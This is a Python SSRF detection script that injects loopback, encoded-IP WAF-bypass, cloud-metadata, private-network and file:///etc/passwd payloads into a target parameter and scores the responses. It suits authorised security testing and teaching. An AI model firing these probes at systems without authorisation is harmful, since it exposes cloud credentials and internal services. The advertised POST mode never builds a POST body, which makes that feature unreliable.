"""
Basic SSRF Tester (Detection-Only)
========================================================
A comprehensive SSRF testing tool that injects internal-IP payloads (including
WAF-bypass encodings) into URL parameters or POST bodies, then compares
response behavior against a safe baseline to detect SSRF indicators.

Detection-only: This tool does NOT exfiltrate data or exploit findings.

Why this matters:
  SSRF is a critical vulnerability (CWE-918). It lets attackers reach internal
  services (databases, admin panels) and steal cloud metadata credentials
  (AWS IAM role tokens, GCP service account tokens) from the instance.

Usage:
  python basic_ssrf_tester.py --url "https://target/api/fetch" --param url
  python basic_ssrf_tester.py --url "https://target/api/fetch" --param url --method POST
  python basic_ssrf_tester.py --url "https://target/api/fetch" --param url --cookie "sess=abc"
  python basic_ssrf_tester.py --url "https://target/api/fetch" --param url --output-json report.json

Sample output (abridged):
  === Basic SSRF Tester ===
  Target  : https://target/api/fetch
  Param   : url
  Payloads: 14

  Baseline: 200 | 142ms | 3200 bytes

  [HIGH] http://169.254.169.254/latest/meta-data/
    Status: 200 | 89ms | Diff: -2800 bytes
    Signals: Response contains metadata keywords; size differs from baseline
    Why: Cloud metadata endpoint responded — IAM credential theft possible

  [MED] http://127.0.0.1 (decimal: 2130706433)
    Status: 200 | 340ms | Diff: +0 bytes
    Signals: Timing anomaly (+198ms vs baseline)

  Summary: 3 HIGH, 4 MED, 7 INFO

Limitations:
  - False positives from network jitter or caching
  - Cannot confirm exploitation without manual verification
  - Bypass encodings may trigger WAF alerts in production
"""

from __future__ import annotations

import argparse
import json
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class ProbeResult:
    payload: str
    category: str           # what the payload targets
    status: int
    elapsed_ms: float
    response_len: int
    error: str
    signals: List[str]
    severity: str           # HIGH / MED / LOW / INFO
    metadata_detected: bool


# ---------------------------------------------------------------------------
# Payload bank — categorized for interview explanation
# ---------------------------------------------------------------------------
# Why multiple encodings: WAFs often block "127.0.0.1" literally but miss
# equivalent representations like decimal IP, IPv6, or URL-encoded forms.

PAYLOADS: List[Dict[str, str]] = [
    # --- Localhost variants ---
    {"url": "http://127.0.0.1", "cat": "localhost", "why": "Direct loopback"},
    {"url": "http://localhost", "cat": "localhost", "why": "DNS resolves to 127.0.0.1"},
    {"url": "http://2130706433", "cat": "localhost_bypass",
     "why": "Decimal IP encoding bypasses string filters"},
    {"url": "http://0x7f000001", "cat": "localhost_bypass",
     "why": "Hex IP encoding bypasses regex filters"},
    {"url": "http://0177.0.0.1", "cat": "localhost_bypass",
     "why": "Octal encoding bypasses naive IP checks"},
    {"url": "http://[::1]", "cat": "localhost_ipv6",
     "why": "IPv6 loopback; filters may only check IPv4"},
    {"url": "http://127.1", "cat": "localhost_bypass",
     "why": "Shortened IP — OS interprets as 127.0.0.1"},

    # --- Cloud metadata ---
    {"url": "http://169.254.169.254/latest/meta-data/", "cat": "aws_metadata",
     "why": "AWS instance metadata — exposes IAM credentials"},
    {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cat": "azure_metadata",
     "why": "Azure IMDS — exposes managed identity tokens"},
    {"url": "http://metadata.google.internal/computeMetadata/v1/", "cat": "gcp_metadata",
     "why": "GCP metadata — exposes service account tokens"},

    # --- Private networks ---
    {"url": "http://10.0.0.1", "cat": "private_rfc1918",
     "why": "Internal network probe (10.x.x.x)"},
    {"url": "http://192.168.1.1", "cat": "private_rfc1918",
     "why": "Internal network probe (192.168.x.x)"},

    # --- Protocol tricks ---
    {"url": "file:///etc/passwd", "cat": "file_protocol",
     "why": "file:// protocol reads local filesystem if supported"},
    {"url": "http://169.254.169.254.nip.io", "cat": "dns_rebind",
     "why": "DNS rebinding via wildcard DNS service"},
]

# Keywords that indicate metadata content was returned
METADATA_KEYWORDS = [
    "iam", "ami-id", "instance-id", "security-credentials",
    "access-key", "secret", "token", "account", "role",
    "computemetadata", "service-account", "managed-identity",
]


# ---------------------------------------------------------------------------
# Core logic
# ---------------------------------------------------------------------------

def send_request(
    url: str, timeout: int, insecure: bool,
    method: str = "GET", cookie: str = "", headers: Dict[str, str] = None,
) -> tuple:
    """
    Send request and return (status, elapsed_ms, content_bytes, error).
    Why measure all three: SSRF manifests via timing, content, or errors.
    """
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", "Mozilla/5.0 (SSRFTester/2.0)")
    if cookie:
        req.add_header("Cookie", cookie)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    start = time.perf_counter()
    status = 0
    content = b""
    error = ""

    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        status = resp.getcode()
        content = resp.read() or b""
    except urllib.error.HTTPError as e:
        status = e.code
        content = e.read() or b""
    except Exception as e:
        error = type(e).__name__ + ": " + str(e)[:100]

    elapsed_ms = (time.perf_counter() - start) * 1000
    return status, elapsed_ms, content, error


def build_url_get(base_url: str, param: str, payload: str) -> str:
    """Inject payload into query parameter."""
    parsed = urllib.parse.urlsplit(base_url)
    q = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    q[param] = [payload]
    new_query = urllib.parse.urlencode(q, doseq=True)
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))


def build_url_post(base_url: str, param: str, payload: str) -> tuple:
    """Build POST body with payload. Returns (url, body_bytes, content_type)."""
    body = urllib.parse.urlencode({param: payload}).encode()
    return base_url, body, "application/x-www-form-urlencoded"


def analyze(
    baseline_status: int, baseline_ms: float, baseline_len: int,
    status: int, elapsed_ms: float, content: bytes, error: str,
    category: str,
) -> tuple:
    """
    Multi-signal analysis comparing probe to baseline.
    Returns (signals_list, severity, metadata_detected).
    Why multi-signal: single heuristics cause false positives; combining
    timing + size + content + status gives higher confidence.
    """
    signals: List[str] = []
    severity = "INFO"
    metadata_detected = False

    time_delta = elapsed_ms - baseline_ms
    size_delta = len(content) - baseline_len

    # Timing anomaly
    if time_delta > 800:
        signals.append(f"Strong timing delay (+{time_delta:.0f}ms vs baseline)")
        severity = "MED"
    elif time_delta > 400:
        signals.append(f"Moderate timing anomaly (+{time_delta:.0f}ms)")

    # Size difference
    if abs(size_delta) > 200:
        signals.append(f"Response size differs from baseline ({size_delta:+d} bytes)")
        severity = "MED"

    # Status difference
    if status != baseline_status and status >= 500:
        signals.append(f"Server error (HTTP {status}) on internal target")
        severity = "MED"
    elif status != baseline_status:
        signals.append(f"Status code changed ({baseline_status} → {status})")

    # Metadata keyword detection in response body
    content_lower = content.decode("utf-8", errors="ignore").lower()
    found_keywords = [kw for kw in METADATA_KEYWORDS if kw in content_lower]
    if found_keywords:
        signals.append(f"Response contains metadata keywords: {', '.join(found_keywords[:3])}")
        metadata_detected = True
        severity = "HIGH"

    # Network error (often means server tried to connect internally)
    if error and "timeout" in error.lower():
        signals.append("Timeout suggests server attempted internal connection")
        severity = "MED"
    elif error and "refused" in error.lower():
        signals.append("Connection refused — port closed but server tried to reach it")
        severity = "MED"

    # Cloud metadata category gets elevated severity if accepted
    if category in ("aws_metadata", "azure_metadata", "gcp_metadata") and 200 <= status < 400:
        if severity != "HIGH":
            severity = "HIGH"
            signals.append("Cloud metadata endpoint returned success status")

    if not signals:
        signals.append("No strong signal")

    return signals, severity, metadata_detected


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def print_report(url: str, param: str, results: List[ProbeResult], baseline_ms: float) -> None:
    print("=== Basic SSRF Tester ===")
    print(f"Target  : {url}")
    print(f"Param   : {param}")
    print(f"Payloads: {len(results)}\n")
    print(f"Baseline: {baseline_ms:.0f}ms\n")

    sev_counts = {"HIGH": 0, "MED": 0, "INFO": 0}
    for r in results:
        sev_counts[r.severity] = sev_counts.get(r.severity, 0) + 1
        print(f"[{r.severity}] {r.payload}")
        print(f"  Category: {r.category}")
        print(f"  Status: {r.status} | {r.elapsed_ms:.0f}ms | Size: {r.response_len} bytes")
        if r.error:
            print(f"  Error: {r.error}")
        print(f"  Signals: {'; '.join(r.signals)}")
        print()

    print(f"Summary: {sev_counts.get('HIGH', 0)} HIGH, {sev_counts.get('MED', 0)} MED, "
          f"{sev_counts.get('INFO', 0)} INFO")
    print()

    # Educational section
    print("=" * 55)
    print("SSRF attack flow:")
    print("  1. Attacker finds endpoint that fetches a user-supplied URL")
    print("  2. Injects internal targets (localhost, metadata, private IPs)")
    print("  3. Server fetches resource from internal network")
    print("  4. Response leaks internal data or credentials to attacker")
    print()
    print("Cloud metadata risks:")
    print("  - AWS 169.254.169.254: IAM role credentials (AccessKeyId + SecretAccessKey)")
    print("  - Azure IMDS: managed identity OAuth tokens")
    print("  - GCP metadata: service account tokens with project access")
    print("  - IMDSv2 (AWS) requires a PUT-based token; mitigates basic SSRF")
    print()
    print("Bypass techniques tested:")
    print("  - Decimal/hex/octal IP encodings (bypass string matching)")
    print("  - IPv6 [::1] (bypass IPv4-only filters)")
    print("  - Shortened IP (127.1)")
    print("  - DNS rebinding (nip.io resolves to arbitrary IPs)")
    print("  - file:// protocol (local file read)")
    print()
    print("Detection challenges:")
    print("  - Blind SSRF: no response body returned to attacker")
    print("  - Timing-only signals need multiple samples to confirm")
    print("  - WAFs can block payloads but miss encoded variants")
    print()
    print("Limitations:")
    print("  - Detection-only; does not exfiltrate or exploit")
    print("  - Network jitter causes timing false positives")
    print("  - Some apps sanitize all URLs uniformly (no differential signal)")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSRF detection tool — injects internal IP payloads and analyzes response",
    )
    parser.add_argument("--url", required=True, help="Target endpoint URL")
    parser.add_argument("--param", required=True, help="Parameter to inject payloads into")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"],
                        help="HTTP method (default: GET)")
    parser.add_argument("--cookie", default="", help="Cookie header for auth")
    parser.add_argument("--header", action="append", default=[],
                        help="Extra header (repeatable): 'Name: Value'")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout (seconds)")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS verification")
    parser.add_argument("--output-json", help="Write JSON report to file")

    args = parser.parse_args()

    # Parse extra headers
    extra_headers: Dict[str, str] = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    # --- Baseline: use safe external URL ---
    baseline_url = build_url_get(args.url, args.param, "http://example.com")
    b_status, b_ms, b_content, b_error = send_request(
        baseline_url, args.timeout, args.insecure, args.method, args.cookie, extra_headers,
    )

    # --- Probe each payload ---
    results: List[ProbeResult] = []
    for p in PAYLOADS:
        test_url = build_url_get(args.url, args.param, p["url"])
        status, elapsed_ms, content, error = send_request(
            test_url, args.timeout, args.insecure, args.method, args.cookie, extra_headers,
        )

        signals, severity, meta = analyze(
            b_status, b_ms, len(b_content),
            status, elapsed_ms, content, error, p["cat"],
        )

        results.append(ProbeResult(
            payload=p["url"],
            category=f"{p['cat']} — {p['why']}",
            status=status,
            elapsed_ms=elapsed_ms,
            response_len=len(content),
            error=error,
            signals=signals,
            severity=severity,
            metadata_detected=meta,
        ))

    print_report(args.url, args.param, results, b_ms)

    if args.output_json:
        report = {
            "target": args.url,
            "param": args.param,
            "method": args.method,
            "baseline_ms": b_ms,
            "results": [asdict(r) for r in results],
            "summary": {
                "high": sum(1 for r in results if r.severity == "HIGH"),
                "med": sum(1 for r in results if r.severity == "MED"),
                "info": sum(1 for r in results if r.severity == "INFO"),
            },
        }
        with open(args.output_json, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"\nJSON report written to {args.output_json}")


if __name__ == "__main__":
    main()
